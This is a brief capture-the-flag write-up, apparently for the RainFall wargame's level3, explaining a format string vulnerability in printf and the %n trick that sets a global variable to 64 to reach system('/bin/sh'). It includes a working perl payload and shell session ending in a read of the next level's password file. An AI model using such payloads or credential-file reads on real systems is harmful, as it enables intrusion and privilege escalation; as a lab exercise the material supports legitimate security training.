After fgets (protected from overflows) and printf calls if m == 64 there is a call to system("/bin/sh")
m is a global variable stored at 0x0804988c

Format string exploit:
%n	write current printed length to the variable pointed by arg
$	allows us to choose the offset printf args

We can set m to 64 by writing 64 char before %n and move
the offset to the address at the beginning of the string

	perl -e 'print "\x8c\x98\x04\x08   [some spaces to get to 64 of length]   %4\$n\n"' > /tmp/str
	level3@RainFall:~$ cat /tmp/str - | ./level3
	[unprintable char]
	Wait what?!
	whoami
	level4
	cat /home/user/level4/.pass
